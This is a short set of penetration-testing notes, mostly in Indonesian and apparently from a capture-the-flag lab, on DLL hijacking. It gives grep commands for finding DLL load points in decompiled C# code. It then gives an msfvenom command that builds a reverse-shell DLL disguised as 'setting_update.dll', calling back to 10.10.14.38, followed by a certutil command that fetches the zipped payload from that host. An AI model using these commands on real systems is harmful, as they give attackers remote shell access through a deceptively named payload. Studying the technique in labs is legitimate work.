## Dynamic Link Library
**DLL (Dynamic Link Library)** adalah **kumpulan kode atau fungsi yang siap pakai, yang bisa digunakan oleh banyak aplikasi Windows sekaligus.**

Jika sebuah aplikasi utama berbentuk `.exe` (eksekusi), maka `.dll` adalah file pendukungnya.

Dangerous Code
```shell
# 1. Cari titik LOAD (paling penting)
grep -in "LoadLibrary\|Assembly.LoadFrom\|Assembly.Load(" output_folder/*.cs

# 2. Cari titik "isi" DLL datang dari mana (extract/copy/download)
grep -in "ExtractToDirectory\|File.Copy\|WebClient\|DownloadFile" output_folder/*.cs

# 3. Cari eksekusi function setelah load
grep -in "GetProcAddress\|GetDelegateForFunctionPointer" 


# gabung semuanya
grep -niE "LoadLibrary|Assembly\.LoadFrom|ExtractToDirectory|File\.Copy|GetProcAddress|DownloadFile|Process\.Start"
```

## Make payload
```shell
# x64
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.38 LPORT=4445 -f dll -o setting_update.dll

# x86 / Intel i386
```
![](Attachments/Pasted%20image%2020260706134245.png)
make zip
```shell
zip -r Setting_Update.zip setting_update.dll
```
send to attacker machine
```shell
certutil -urlcache -split -f http://10.10.14.38:9090/Setting_Update.zip Setting_Update.zip
```
![](Attachments/Pasted%20image%2020260706135131.png)